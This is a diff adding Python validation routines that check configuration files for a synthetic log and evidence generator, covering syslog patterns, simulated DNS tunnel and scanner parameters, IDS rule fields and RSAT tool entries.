+                if not isinstance(message, str):
+                    continue
+                message_lower = message.lower()
+                schedule_native_patterns = (
+                    "apt.systemd.daily",
+                    "cron.daily",
+                    "cron.hourly",
+                    "debian-sa1",
+                    "logrotate /etc/logrotate.conf",
+                    "update-motd-reboot-required",
+                    "/tmp -xdev -type f -mtime",
+                )
+                if any(pattern in message_lower for pattern in schedule_native_patterns):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "extra_syslog_messages.yaml",
+                            (
+                                f'App "{app}" has schedule-native cron/systemd message '
+                                f'"{message}"; use systemd_schedules.yaml or a '
+                                "dedicated schedule-aware generator instead"
+                            ),
+                        )
+                    )
+                if app == "NetworkManager" and "state change:" in message:
+                    transition = message.split("state change:", 1)[1].strip()
+                    transition = transition.split("{", 1)[0].strip()
+                    if "->" in transition:
+                        before, after = [part.strip() for part in transition.split("->", 1)]
+                        if before and after and before == after:
+                            result.issues.append(
+                                Issue(
+                                    "ERROR",
+                                    "extra_syslog_messages.yaml",
+                                    (
+                                        "NetworkManager state transition must change states, "
+                                        f'got "{message}"'
+                                    ),
+                                )
+                            )
+
+    # systemd_schedules.yaml
+    from evidenceforge.generation.engine.baseline import _load_systemd_schedules
+
+    schedules = _load_systemd_schedules()
+    if schedules:
+        _SCHEMA_CHECKS.append((schedules, SystemdScheduleEntry, "systemd_schedules.yaml"))
+
+    # network_params.yaml
+    from evidenceforge.generation.activity.network_params import load_network_params
+
+    net_params = load_network_params()
+    if net_params:
+        _SCHEMA_CHECKS.append((net_params.get("oui_prefixes", []), OuiEntry, "network_params.yaml"))
+        _SCHEMA_CHECKS.append(
+            (
+                net_params.get("public_dns_resolvers", []),
+                PublicDnsResolverEntry,
+                "network_params.yaml (public_dns_resolvers)",
+            )
+        )
+        _SCHEMA_CHECKS.append(
+            (
+                net_params.get("public_ntp_servers", []),
+                PublicNtpServerEntry,
+                "network_params.yaml (public_ntp_servers)",
+            )
+        )
+        err = validate_entry(
+            net_params.get("dns_tunnel_rtt", {}),
+            DnsTunnelRttConfig,
+            "network_params.yaml (dns_tunnel_rtt)",
+        )
+        if err:
+            result.issues.append(Issue("ERROR", "network_params.yaml (dns_tunnel_rtt)", err))
+        err = validate_entry(
+            net_params.get("nmap_command_probe", {}),
+            NmapCommandProbeConfig,
+            "network_params.yaml (nmap_command_probe)",
+        )
+        if err:
+            result.issues.append(Issue("ERROR", "network_params.yaml (nmap_command_probe)", err))
+        templates = net_params.get("dns_tunnel_response_templates", [])
+        if not isinstance(templates, list) or not templates:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "network_params.yaml (dns_tunnel_response_templates)",
+                    "dns_tunnel_response_templates must be a non-empty list",
+                )
+            )
+        else:
+            allowed_template_fields = {"token", "seq", "seq_hex", "edge"}
+            for idx, template in enumerate(templates):
+                if not isinstance(template, str) or "{token}" not in template:
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "network_params.yaml (dns_tunnel_response_templates)",
+                            f"entry {idx} must be a string containing '{{token}}'",
+                        )
+                    )
+                    continue
+                unknown_fields = {
+                    field
+                    for field in re.findall(r"\{([A-Za-z_][A-Za-z0-9_]*)\}", template)
+                    if field not in allowed_template_fields
+                }
+                if unknown_fields:
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "network_params.yaml (dns_tunnel_response_templates)",
+                            (
+                                f"entry {idx} uses unsupported placeholder(s): "
+                                f"{', '.join(sorted(unknown_fields))}"
+                            ),
+                        )
+                    )
+                    continue
+                literal_text = re.sub(
+                    r"\{[A-Za-z_][A-Za-z0-9_]*\}",
+                    "",
+                    template,
+                ).lower()
+                if re.search(r"[a-z]{3,}", literal_text):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "network_params.yaml (dns_tunnel_response_templates)",
+                            (
+                                f"entry {idx} contains readable literal text; "
+                                "DNS tunnel response templates should stay opaque"
+                            ),
+                        )
+                    )
+        ttl_choices = net_params.get("dns_tunnel_ttl_choices", [])
+        if not isinstance(ttl_choices, list) or not ttl_choices:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "network_params.yaml (dns_tunnel_ttl_choices)",
+                    "dns_tunnel_ttl_choices must be a non-empty list",
+                )
+            )
+        else:
+            _SCHEMA_CHECKS.append(
+                (
+                    ttl_choices,
+                    DnsTunnelTtlEntry,
+                    "network_params.yaml (dns_tunnel_ttl_choices)",
+                )
+            )
+            total_ttl_weight = 0.0
+            for entry in ttl_choices:
+                if not isinstance(entry, dict):
+                    continue
+                weight = entry.get("weight", 1.0)
+                if not isinstance(weight, int | float):
+                    continue
+                total_ttl_weight += float(weight)
+            if not math.isfinite(total_ttl_weight):
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "network_params.yaml (dns_tunnel_ttl_choices)",
+                        "total dns_tunnel_ttl_choices weight must be finite",
+                    )
+                )
+        scanner_profiles = net_params.get("external_scanner_port_profiles", [])
+        if scanner_profiles:
+            _SCHEMA_CHECKS.append(
+                (
+                    scanner_profiles,
+                    ExternalScannerPortProfile,
+                    "network_params.yaml (external_scanner_port_profiles)",
+                )
+            )
+            total_profile_weight = 0.0
+            for profile in scanner_profiles:
+                if not isinstance(profile, dict):
+                    continue
+                weight = profile.get("weight", 1.0)
+                if not isinstance(weight, int | float):
+                    continue
+                total_profile_weight += float(weight)
+            if not math.isfinite(total_profile_weight):
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "network_params.yaml (external_scanner_port_profiles)",
+                        "total external_scanner_port_profiles weight must be finite",
+                    )
+                )
+            for idx, profile in enumerate(scanner_profiles):
+                if not isinstance(profile, dict):
+                    continue
+                ports = profile.get("ports", [])
+                if not isinstance(ports, list):
+                    continue
+                total_port_weight = 0.0
+                for port_entry in ports:
+                    if not isinstance(port_entry, dict):
+                        continue
+                    weight = port_entry.get("weight", 1.0)
+                    if not isinstance(weight, int | float):
+                        continue
+                    total_port_weight += float(weight)
+                if not math.isfinite(total_port_weight):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "network_params.yaml (external_scanner_port_profiles)",
+                            (
+                                f"entry {idx} has non-finite cumulative port weight; "
+                                "total per-profile port weight must be finite"
+                            ),
+                        )
+                    )
+        rcode_weights = net_params.get("dns_tunnel_rcode_weights", {})
+        allowed_rcodes = {"NOERROR", "NXDOMAIN", "SERVFAIL", "REFUSED"}
+        if not isinstance(rcode_weights, dict) or not rcode_weights:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "network_params.yaml (dns_tunnel_rcode_weights)",
+                    "dns_tunnel_rcode_weights must be a non-empty mapping",
+                )
+            )
+        else:
+            total_weight = 0.0
+            for rcode, weight in rcode_weights.items():
+                if str(rcode).upper() not in allowed_rcodes:
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "network_params.yaml (dns_tunnel_rcode_weights)",
+                            f"unsupported rcode '{rcode}'",
+                        )
+                    )
+                    continue
+                if (
+                    not isinstance(weight, int | float)
+                    or weight <= 0
+                    or not math.isfinite(float(weight))
+                ):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "network_params.yaml (dns_tunnel_rcode_weights)",
+                            f"weight for '{rcode}' must be a positive finite number",
+                        )
+                    )
+                    continue
+                total_weight += float(weight)
+            if total_weight <= 0 or not math.isfinite(total_weight):
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "network_params.yaml (dns_tunnel_rcode_weights)",
+                        "response-code weights must have a positive finite total",
+                    )
+                )
+        proxy_status_messages = net_params.get("proxy_connect_status_messages", {})
+        if not isinstance(proxy_status_messages, dict) or not proxy_status_messages:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "network_params.yaml (proxy_connect_status_messages)",
+                    "proxy_connect_status_messages must be a non-empty mapping",
+                )
+            )
+        else:
+            for status_code, messages in proxy_status_messages.items():
+                try:
+                    numeric_status = int(status_code)
+                except (TypeError, ValueError):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "network_params.yaml (proxy_connect_status_messages)",
+                            f"status code '{status_code}' must be an integer",
+                        )
+                    )
+                    continue
+                if numeric_status < 100 or numeric_status > 599:
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "network_params.yaml (proxy_connect_status_messages)",
+                            f"status code '{status_code}' must be between 100 and 599",
+                        )
+                    )
+                    continue
+                if isinstance(messages, str):
+                    message_list = [messages]
+                elif isinstance(messages, list):
+                    message_list = messages
+                else:
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "network_params.yaml (proxy_connect_status_messages)",
+                            f"messages for status {numeric_status} must be a string or list",
+                        )
+                    )
+                    continue
+                if not message_list or not all(
+                    isinstance(message, str) and message.strip() for message in message_list
+                ):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "network_params.yaml (proxy_connect_status_messages)",
+                            f"messages for status {numeric_status} must be non-empty strings",
+                        )
+                    )
+
+    err = validate_entry(windows_auth_data, WindowsAuthRealismConfig, "windows_auth_realism.yaml")
+    if err:
+        result.issues.append(Issue("ERROR", "windows_auth_realism.yaml", err))
+
+    err = validate_entry(auth_noise_data, AuthNoiseConfig, "auth_noise.yaml")
+    if err:
+        result.issues.append(Issue("ERROR", "auth_noise.yaml", err))
+
+    configured_parent_symbols: list[tuple[str, str]] = []
+    for task in sys_proc_data.get("scheduled_tasks", []):
+        if isinstance(task, dict):
+            configured_parent_symbols.append(
+                ("system_processes.yaml (scheduled_tasks)", str(task.get("parent") or ""))
+            )
+    for role, entries in sys_proc_data.get("system_services", {}).items():
+        if not isinstance(entries, list):
+            continue
+        for entry in entries:
+            if isinstance(entry, dict):
+                configured_parent_symbols.append(
+                    (
+                        f"system_processes.yaml (system_services.{role})",
+                        str(entry.get("parent") or ""),
+                    )
+                )
+    delegation = auth_noise_data.get("service_account_delegation", {})
+    for profile in delegation.get("caller_profiles", []):
+        if not isinstance(profile, dict):
+            continue
+        for process in profile.get("processes", []):
+            if isinstance(process, dict):
+                configured_parent_symbols.append(
+                    (
+                        "auth_noise.yaml (service_account_delegation)",
+                        str(process.get("parent_key") or "services"),
+                    )
+                )
+    for source, parent_symbol in configured_parent_symbols:
+        if parent_symbol not in WINDOWS_SEEDED_PARENT_SYMBOLS:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    source,
+                    f"unknown seeded Windows parent symbol {parent_symbol!r}",
+                )
+            )
+
+    if isinstance(proxy_ua_data.get("domain_overrides"), dict):
+        _SCHEMA_CHECKS.append(
+            (
+                list(proxy_ua_data.get("domain_overrides", {}).values()),
+                ProxyUserAgentOverrideEntry,
+                "proxy_user_agents.yaml (domain_overrides)",
+            )
+        )
+    for proxy_scope in ("workstation", "server"):
+        package_managers = proxy_ua_data.get(proxy_scope, {}).get("package_managers", {})
+        if isinstance(package_managers, dict):
+            _SCHEMA_CHECKS.append(
+                (
+                    list(package_managers.values()),
+                    ProxyUserAgentOverrideEntry,
+                    f"proxy_user_agents.yaml ({proxy_scope}.package_managers)",
+                )
+            )
+
+    # Run all schema validations
+    for entries, schema, file_name in _SCHEMA_CHECKS:
+        if not isinstance(entries, list):
+            continue
+        for entry in entries:
+            if not isinstance(entry, dict):
+                continue
+            err = validate_entry(entry, schema, file_name)
+            if err:
+                entry_id = (
+                    entry.get("domain")
+                    or entry.get("id")
+                    or entry.get("name")
+                    or entry.get("service")
+                    or entry.get("app")
+                    or entry.get("exe")
+                    or "?"
+                )
+                result.issues.append(Issue("ERROR", file_name, f'Entry "{entry_id}": {err}'))
+
+    from evidenceforge.config.beacon_profiles import load_beacon_profiles
+
+    beacon_profiles_err = validate_entry(
+        load_beacon_profiles(),
+        BeaconProfilesConfig,
+        "beacon_profiles.yaml",
+    )
+    if beacon_profiles_err:
+        result.issues.append(Issue("ERROR", "beacon_profiles.yaml", beacon_profiles_err))
+
+    # Deduplicate issues (some checks may flag the same thing multiple times)
+
+
+def _validate_web_scan_ids(
+    *,
+    _record_ids_rule_identity: Callable[..., None],
+    _validate_ids_numeric_field: Callable[..., None],
+    _validate_ids_signature_predicate: Callable[..., None],
+    result: ValidationResult,
+) -> None:
+    """Validate web scan ids in the established diagnostic order."""
+    # --- Check: Web scan preset IDS configuration ---
+    from evidenceforge.config.web_scan_presets import (
+        list_preset_names,
+        load_web_scan_presets,
+        parse_positive_finite_rate,
+    )
+
+    scan_data = load_web_scan_presets()
+    presets = scan_data.get("presets", {})
+    _IDS_REQUIRED_FIELDS = {"sid", "message"}
+    for name in list_preset_names():
+        preset = presets.get(name, {})
+        max_effective_rate = preset.get("max_effective_rate")
+        if (
+            max_effective_rate is not None
+            and parse_positive_finite_rate(max_effective_rate) is None
+        ):
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "web_scan_presets.yaml",
+                    f'Preset "{name}" max_effective_rate must be a positive finite number, got {max_effective_rate}',
+                )
+            )
+        # Validate ids_ua
+        if "ids_ua" in preset:
+            ids_ua = preset["ids_ua"]
+            if not isinstance(ids_ua, dict):
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "web_scan_presets.yaml",
+                        f'Preset "{name}" ids_ua must be a mapping, got {type(ids_ua).__name__}',
+                    )
+                )
+            else:
+                for field in _IDS_REQUIRED_FIELDS:
+                    if field not in ids_ua:
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "web_scan_presets.yaml",
+                                f'Preset "{name}" ids_ua missing required field "{field}"',
+                            )
+                        )
+                _record_ids_rule_identity(
+                    "web_scan_presets.yaml",
+                    ids_ua.get("sid"),
+                    ids_ua.get("gid", 1),
+                    ids_ua.get("message"),
+                )
+                _validate_ids_numeric_field(
+                    "web_scan_presets.yaml", f'Preset "{name}" ids_ua', ids_ua, "sid", required=True
+                )
+                _validate_ids_numeric_field(
+                    "web_scan_presets.yaml", f'Preset "{name}" ids_ua', ids_ua, "rev"
+                )
+                _validate_ids_numeric_field(
+                    "web_scan_presets.yaml", f'Preset "{name}" ids_ua', ids_ua, "priority"
+                )
+                _validate_ids_numeric_field(
+                    "web_scan_presets.yaml", f'Preset "{name}" ids_ua', ids_ua, "gid"
+                )
+                _validate_ids_signature_predicate(
+                    "web_scan_presets.yaml", f'Preset "{name}" ids_ua', ids_ua
+                )
+        # Validate ids_rate
+        if "ids_rate" in preset:
+            ids_rate = preset["ids_rate"]
+            if not isinstance(ids_rate, dict):
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "web_scan_presets.yaml",
+                        f'Preset "{name}" ids_rate must be a mapping, got {type(ids_rate).__name__}',
+                    )
+                )
+            else:
+                for field in _IDS_REQUIRED_FIELDS:
+                    if field not in ids_rate:
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "web_scan_presets.yaml",
+                                f'Preset "{name}" ids_rate missing required field "{field}"',
+                            )
+                        )
+                _record_ids_rule_identity(
+                    "web_scan_presets.yaml",
+                    ids_rate.get("sid"),
+                    ids_rate.get("gid", 1),
+                    ids_rate.get("message"),
+                )
+                _validate_ids_numeric_field(
+                    "web_scan_presets.yaml",
+                    f'Preset "{name}" ids_rate',
+                    ids_rate,
+                    "sid",
+                    required=True,
+                )
+                _validate_ids_numeric_field(
+                    "web_scan_presets.yaml", f'Preset "{name}" ids_rate', ids_rate, "rev"
+                )
+                _validate_ids_numeric_field(
+                    "web_scan_presets.yaml", f'Preset "{name}" ids_rate', ids_rate, "priority"
+                )
+                _validate_ids_numeric_field(
+                    "web_scan_presets.yaml", f'Preset "{name}" ids_rate', ids_rate, "gid"
+                )
+                _validate_ids_signature_predicate(
+                    "web_scan_presets.yaml", f'Preset "{name}" ids_rate', ids_rate
+                )
+                threshold = ids_rate.get("threshold")
+                if threshold is not None and (not isinstance(threshold, int) or threshold < 1):
+                    result.issues.append(
+                        Issue(
+                            "WARNING",
+                            "web_scan_presets.yaml",
+                            f'Preset "{name}" ids_rate threshold must be a positive integer, got {threshold}',
+                        )
+                    )
+        # Validate per-path ids entries
+        for i, path_entry in enumerate(preset.get("paths", [])):
+            if isinstance(path_entry, dict) and "ids" in path_entry:
+                path_ids = path_entry["ids"]
+                if not isinstance(path_ids, dict):
+                    result.issues.append(
+                        Issue(
+                            "ERROR",
+                            "web_scan_presets.yaml",
+                            f'Preset "{name}" path #{i + 1} ({path_entry.get("uri", "?")}) ids must be a mapping, got {type(path_ids).__name__}',
+                        )
+                    )
+                    continue
+                for field in _IDS_REQUIRED_FIELDS:
+                    if field not in path_ids:
+                        result.issues.append(
+                            Issue(
+                                "ERROR",
+                                "web_scan_presets.yaml",
+                                f'Preset "{name}" path #{i + 1} ({path_entry.get("uri", "?")}) ids missing "{field}"',
+                            )
+                        )
+                _record_ids_rule_identity(
+                    "web_scan_presets.yaml",
+                    path_ids.get("sid"),
+                    path_ids.get("gid", 1),
+                    path_ids.get("message"),
+                )
+                path_context = f'Preset "{name}" path #{i + 1} ({path_entry.get("uri", "?")}) ids'
+                _validate_ids_numeric_field(
+                    "web_scan_presets.yaml", path_context, path_ids, "sid", required=True
+                )
+                _validate_ids_numeric_field("web_scan_presets.yaml", path_context, path_ids, "rev")
+                _validate_ids_numeric_field(
+                    "web_scan_presets.yaml", path_context, path_ids, "priority"
+                )
+                _validate_ids_numeric_field("web_scan_presets.yaml", path_context, path_ids, "gid")
+                _validate_ids_signature_predicate("web_scan_presets.yaml", path_context, path_ids)
+
+
+def _validate_rsat_tools(
+    *,
+    result: ValidationResult,
+) -> None:
+    """Validate rsat tools in the established diagnostic order."""
+    # --- RSAT tools validation ---
+    from evidenceforge.generation.activity.rsat_tools import load_rsat_tools
+
+    rsat_tools = load_rsat_tools()
+    _RSAT_REQUIRED = {"id", "snap_in", "command_line", "target_ports", "weight"}
+    for tool in rsat_tools:
+        tool_id = tool.get("id", "<unnamed>")
+        missing = _RSAT_REQUIRED - set(tool.keys())
+        if missing:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "rsat_tools.yaml",
+                    f'Tool "{tool_id}" missing fields: {sorted(missing)}',
+                )
+            )
+        if not isinstance(tool.get("weight", 0), int) or tool.get("weight", 0) < 1:
+            result.issues.append(
+                Issue(
+                    "ERROR",
+                    "rsat_tools.yaml",
+                    f'Tool "{tool_id}" weight must be a positive integer',
+                )
+            )
+        for i, port_info in enumerate(tool.get("target_ports", [])):
+            if "port" not in port_info or "service" not in port_info:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "rsat_tools.yaml",
+                        f'Tool "{tool_id}" target_ports[{i}] missing port or service',
+                    )
+                )
+        for i, mod in enumerate(tool.get("loaded_modules", [])):
+            if "path" not in mod:
+                result.issues.append(
+                    Issue(
+                        "ERROR",
+                        "rsat_tools.yaml",
+                        f'Tool "{tool_id}" loaded_modules[{i}] missing path',
+                    )
+                )
+            elif "\\" not in mod["path"]:
+                result.issues.append(
+                    Issue(
+                        "WARNING",
+                        "rsat_tools.yaml",
+                        f'Tool "{tool_id}" loaded_modules[{i}] path does not look like a Windows path',
+                    )
+                )
